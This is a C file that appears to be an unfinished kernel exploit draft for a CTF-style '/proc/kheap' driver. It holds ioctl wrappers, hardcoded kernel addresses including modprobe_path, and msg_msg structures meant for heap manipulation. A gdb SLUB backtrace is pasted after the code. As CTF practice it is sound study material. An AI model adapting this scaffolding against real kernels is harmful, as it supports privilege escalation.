#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#define MSG_COPY                    040000  /* copy (not remove) all queue messages */


int do_print = 0x5702;
int pre_flag = 0x5704;
int cp_user = 0x5700;
int kefree = 0x5703;
int cp_from_user = 0x5701;

unsigned long modprobe_path_addr = 0xffffffffbdf3f4c0;
unsigned long leak_addr =          0xffffffffbc6ef2b0;


typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

typedef struct _msgbuf_t {
    long mtype;
    char buf[0x10000];
}msgbuf_t;


kheap_req_t kheap_req;


char ezblock() {
    puts("blocking! intput c continue");
    char a;
    read(0, &a, 1);
    return a;
}


unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int open_fd()
{
    int fd = open("/proc/kheap", 0);
    return fd;
}

void free_slot(int fd)
{
    int ret = ioctl(fd, kefree, &kheap_req);
    printf("free %d\n", ret);
}

void read_slot(int fd)
{
    int ret = ioctl(fd, cp_user, &kheap_req);
    printf("read %d\n", ret);
}

void cpy_flag(int fd)
{
    int ret = ioctl(fd, pre_flag, &kheap_req);
    printf("cpy_flag %d\n", ret);
}

void write_slot(int fd)
{
    int ret = ioctl(fd, cp_from_user, &kheap_req);
    printf("write %d\n", ret);
}

typedef struct _msg_msg{
    unsigned long next;
    unsigned long prev;
    long m_type;
    size_t m_ts;
    unsigned long msgseg;
    void *security;
}msg_msg;

char buf [1024];
msg_msg msg_buf;
unsigned long pnext = 0;
unsigned long pprev = 0;

int main()
{

    unsigned long do_print_addr = 0;
    int fd_save = -1;

    int fds[0x40] = {0};


    kheap_req.ubuf = buf;
    kheap_req.size = 0x1d0;

    unsigned long leak[2];
    memcpy(buf, "AAAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;

    int fd_1 = open_fd();

    free_slot(fd_1);
}
#0  freelist_ptr_encode (ptr_addr=0xffff888004a5a100, ptr=0x0 <fixed_percpu_data>, s=0xffff888003844100) at mm/slub.c:380
#1  set_freepointer (fp=0x0 <fixed_percpu_data>, object=0xffff888004a5a000, s=0xffff888003844100) at mm/slub.c:452
#2  slab_free_freelist_hook (cnt=<synthetic pointer>, tail=<synthetic pointer>, head=<synthetic pointer>, s=0xffff888003844100) at mm/slub.c:1828
#3  slab_free (addr=0xffffffffc00000be, cnt=0x1, p=<synthetic pointer>, tail=0x0 <fixed_percpu_data>, head=0x0 <fixed_percpu_data>, slab=0xffffea0000129680, s=0xffff888003844100) at mm/slub.c:3809
#4  __kmem_cache_free (s=0xffff888003844100, x=0xffff888004a5a000, caller=0xffffffffc00000be) at mm/slub.c:3822